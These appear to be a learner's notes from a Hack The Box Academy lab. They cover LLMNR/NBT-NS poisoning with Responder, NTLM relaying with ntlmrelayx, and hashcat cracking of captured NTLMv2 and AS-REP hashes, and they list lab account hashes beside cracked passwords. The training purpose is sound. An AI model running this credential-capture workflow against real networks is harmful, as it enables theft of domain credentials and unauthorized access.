 https://academy.hackthebox.com/module/143/section/1272
 -DNS FAILS > LLMNR 
				  LLMNR FAILS > NBT-NS 
ALL HOST IDENTETYFECATION techniques

---
`5355` <> LLMNR
`137` <> NBT-NS

---

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply

---
LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain <> `sudo ntlmrelayx.py -tf targets.txt -smb2support`


---
-normal domain user > access mssql > run responder > using mssql ,xp_derte > action > capture mssql servecs account hash .

---
## Responder

- LLMNR
- DNS
- MDNS
- NBNS
- DHCP
- ICMP
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Auth
-
- MSSQL
- DCE-RPC
- FTP, POP3, IMAP, and SMTP auth
---
```shell-session
AhmaDb0x@htb[/htb]$ responder -h
wf == start the WPAD rogue proxy server
f   == will attempt to fingerprint the remote host operating system and version
-w == capture all HTTP requests by any users that launch Internet Explorer(auto detect)

located in the `/usr/share/responder/logs` directory.

```
-must be opened in our attack host
```shell-session
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

#### Starting Responder with Default Settings
```bash
sudo responder -I ens224 
```

mode `5600` for NTLMv2

no relay:
**Pass-the-Hash (PtH)** works by directly using the **NT hash** (also called the **NTLM hash**)
NetNTLMv2 cannot reuse it for new sessions because it depends on that **specific server's challenge**

---
#### Cracking an NTLMv2 Hash With Hashcat
```shell-session
AhmaDb0x@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```


172.16.5.130
forend::INLANEFREIGHT:6eea3b3627582ce9:9FE2FC92E3168D2D14564C964850D0A9:0101000000000000009D42495D88DB011E3EA202A855A73D00000000020008004C00390039004D0001001E00570049004E002D004C0047005600490042005A00520051005A004B00490004003400570049004E002D004C0047005600490042005A00520051005A004B0049002E004C00390039004D002E004C004F00430041004C00030014004C00390039004D002E004C004F00430041004C00050014004C00390039004D002E004C004F00430041004C0007000800009D42495D88DB0106000400020000000800300030000000000000000000000000300000B46FC6F28EE1877AB4A8B29F5660A35EAFC135FE5EA3BFFBCC1BD8A3F05854320A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000                     

---

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\svc_qualys  <> security#1
[SMB] NTLMv2-SSP Hash     : svc_qualys::INLANEFREIGHT:4da16c15236a1d93:0B3CC5EDF6C009D17ABAB72DD2BCA4A8:0101000000000000009D42495D88DB01B6707554AEB2313900000000020008004C00390039004D0001001E00570049004E002D004C0047005600490042005A00520051005A004B00490004003400570049004E002D004C0047005600490042005A00520051005A004B0049002E004C00390039004D002E004C004F00430041004C00030014004C00390039004D002E004C004F00430041004C00050014004C00390039004D002E004C004F00430041004C0007000800009D42495D88DB0106000400020000000800300030000000000000000000000000300000B46FC6F28EE1877AB4A8B29F5660A35EAFC135FE5EA3BFFBCC1BD8A3F05854320A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000                                                                                                               

---

SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley <> transporter@4
[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:67151d3057139619:7B994B11809B0321BB4EF779CD791004:0101000000000000009D42495D88DB01D854E448C18ACCE000000000020008004C00390039004D0001001E00570049004E002D004C0047005600490042005A00520051005A004B00490004003400570049004E002D004C0047005600490042005A00520051005A004B0049002E004C00390039004D002E004C004F00430041004C00030014004C00390039004D002E004C004F00430041004C00050014004C00390039004D002E004C004F00430041004C0007000800009D42495D88DB0106000400020000000800300030000000000000000000000000300000B46FC6F28EE1877AB4A8B29F5660A35EAFC135FE5EA3BFFBCC1BD8A3F05854320A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000                                                                                                                     

---

[MSSQL] NTLMv2 Client   : 172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:063c6bd78cbc800b:8D23E47B2A326340B9A259C0C8CF3608:0101000000000000C499DA328788DB01DAECA87CE1EE9DD300000000020008004C00390039004D0001001E00570049004E002D004C0047005600490042005A00520051005A004B004900040014004C00390039004D002E004C004F00430041004C0003003400570049004E002D004C0047005600490042005A00520051005A004B0049002E004C00390039004D002E004C004F00430041004C00050014004C00390039004D002E004C004F00430041004C000800300030000000000000000000000000300000B46FC6F28EE1877AB4A8B29F5660A35EAFC135FE5EA3BFFBCC1BD8A3F05854320A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000                                                                                                            

---

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\clusteragent
[SMB] NTLMv2-SSP Hash     : clusteragent::INLANEFREIGHT:f6954225becc3f76:E008154EFC8F83A69CC97126925FEBA7:0101000000000000006E07215E88DB01677F1AA983BDADA100000000020008003200420051004D0001001E00570049004E002D004400390056005A005000460033004500480041004A0004003400570049004E002D004400390056005A005000460033004500480041004A002E003200420051004D002E004C004F00430041004C00030014003200420051004D002E004C004F00430041004C00050014003200420051004D002E004C004F00430041004C0007000800006E07215E88DB0106000400020000000800300030000000000000000000000000300000B46FC6F28EE1877AB4A8B29F5660A35EAFC135FE5EA3BFFBCC1BD8A3F05854320A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000                                                                                                                    

---

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent  <> h1backup55
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:411e37d8e288f8b2:584303EEF988938C1493D61C32CC950C:0101000000000000006E07215E88DB0126833FBC2FE9924200000000020008003200420051004D0001001E00570049004E002D004400390056005A005000460033004500480041004A0004003400570049004E002D004400390056005A005000460033004500480041004A002E003200420051004D002E004C004F00430041004C00030014003200420051004D002E004C004F00430041004C00050014003200420051004D002E004C004F00430041004C0007000800006E07215E88DB0106000400020000000800300030000000000000000000000000300000B46FC6F28EE1877AB4A8B29F5660A35EAFC135FE5EA3BFFBCC1BD8A3F05854320A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000                                                                                                                     

---

krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:4eb5afb9c32b60613767f1b7545652ea$beec978b6f87cfb75a554f27a4dd201ad9057b3e89871e8a999801fd44e9ba50bd942d6551e1424bf81e52204ea91bf2d7aa0394fbe3be34a244481c8665120cd5ec9ac851b567b98ee423182eebc3d9d79f7924a5e68fc46ac90761bd68ff7c64a518ab7df78d5343af10246d02b395750481661e1f2c904c6738927f987d673c41ca3197672ba79a0db2e6e0fb3ef5d814029fff8cbb23c35e3032c9a42acbfe98bc2a5bcaf8247ee828d5be028f92677600265a5a3a474a2ad8e78a9b0997bb969698898c7115b045847fe3977734078a0530e4089615c0fb3481738b6944c3636abc8861bafea1857b5adbc0d32871549f7f13d37b6bee24ec0e3a7655697e9b7e32b7fcc5bf60

---
